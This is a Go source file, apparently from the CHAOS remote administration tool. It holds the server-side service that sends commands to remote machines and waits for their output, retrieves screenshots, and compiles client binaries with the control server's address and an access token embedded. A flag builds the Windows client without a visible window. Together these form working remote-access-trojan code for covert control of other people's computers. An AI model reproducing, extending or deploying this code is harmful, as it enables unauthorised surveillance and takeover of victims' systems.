package client

import (
	"context"
	"fmt"
	"github.com/google/uuid"
	"github.com/tiagorlampert/CHAOS/internal/utils"
	"github.com/tiagorlampert/CHAOS/internal/utils/constants"
	"github.com/tiagorlampert/CHAOS/internal/utils/image"
	"github.com/tiagorlampert/CHAOS/internal/utils/jwt"
	"github.com/tiagorlampert/CHAOS/internal/utils/system"
	"github.com/tiagorlampert/CHAOS/repositories"
	"github.com/tiagorlampert/CHAOS/services/auth"
	"github.com/tiagorlampert/CHAOS/services/payload"
	"os/exec"
	"strings"
	"time"
)

type clientService struct {
	AppVersion     string
	Repository     repositories.Auth
	PayloadService payload.Service
	AuthService    auth.Service
}

func NewClient(
	appVersion string,
	repository repositories.Auth,
	payloadCache payload.Service,
	authService auth.Service,
) Service {
	return &clientService{
		Repository:     repository,
		PayloadService: payloadCache,
		AppVersion:     appVersion,
		AuthService:    authService,
	}
}

func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) (SendCommandOutput, error) {
	addr, err := utils.DecodeBase64(input.MacAddress)
	if err != nil {
		return SendCommandOutput{}, fmt.Errorf(`error decoding base64: %w`, err)
	}

	c.PayloadService.Set(addr, &payload.Data{
		Request: input.Request,
	})
	defer c.PayloadService.Remove(addr)

	var payloadData *payload.Data
	var done bool
	for !done {
		time.Sleep(2 * time.Second)
		res, _ := c.PayloadService.Get(addr)
		res.Request = input.Request
		if res.HasResponse {
			payloadData, _ = HandleResponse(res)
			done = true
		}
	}

	res := utils.ByteToString(payloadData.Response)
	if payloadData.HasError {
		return SendCommandOutput{}, fmt.Errorf(res)
	}
	if len(strings.TrimSpace(res)) == 0 {
		return SendCommandOutput{Response: constants.NoContent}, nil
	}
	return SendCommandOutput{Response: res}, nil
}

func HandleResponse(payload *payload.Data) (*payload.Data, error) {
	switch payload.Request {
	case "screenshot":
		file, err := image.WritePNG(payload.Response)
		if err != nil {
			return nil, err
		}
		payload.Response = utils.StringToByte(file)
		break
	default:
		return payload, nil
	}
	return payload, nil
}

func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error) {
	if !utils.IsValidIPAddress(input.ServerAddress) &&
		!utils.IsValidURL(input.ServerAddress) {
		return "", ErrInvalidServerAddress
	}

	if !utils.StringIsNumber(input.ServerPort) {
		return "", ErrInvalidServerPort
	}

	filename, err := utils.NormalizeString(input.Filename)
	if err != nil {
		return "", err
	}

	token, err := c.GenerateNewToken()
	if err != nil {
		return "", err
	}

	const buildStr = `GO_ENABLED=1 GOOS=%s GOARCH=amd64 go build -ldflags '%s -s -w -X main.Version=%s -X main.ServerPort=%s -X main.ServerAddress=%s -X main.Token=%s -extldflags "-static"' -o ../temp/%s main.go`

	filename = handleFilename(input.OSTarget, filename)
	buildCmd := fmt.Sprintf(buildStr, handleOSType(input.OSTarget), runHidden(input.RunHidden), c.AppVersion, input.ServerPort, input.ServerAddress, token, filename)

	cmd := exec.Command("sh", "-c", buildCmd)
	cmd.Dir = "client/"

	outputErr, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("%w:%s", err, outputErr)
	}
	return filename, nil
}

func (c clientService) GenerateNewToken() (string, error) {
	auth, err := c.AuthService.First()
	if err != nil {
		return "", err
	}
	return jwt.NewToken(auth.SecretKey, jwt.IdentityDefaultUser)
}

func handleOSType(osType system.OSType) string {
	switch osType {
	case system.Windows:
		return "windows"
	case system.Linux:
		return "linux"
	default:
		return "unknown"
	}
}

func runHidden(hidden bool) string {
	if hidden {
		return "-H=windowsgui"
	}
	return ""
}

func handleFilename(osType system.OSType, filename string) string {
	if len(strings.TrimSpace(filename)) <= 0 {
		filename = uuid.New().String()
	}
	switch osType {
	case system.Windows:
		return fmt.Sprint(filename, ".exe")
	default:
		return filename
	}
}
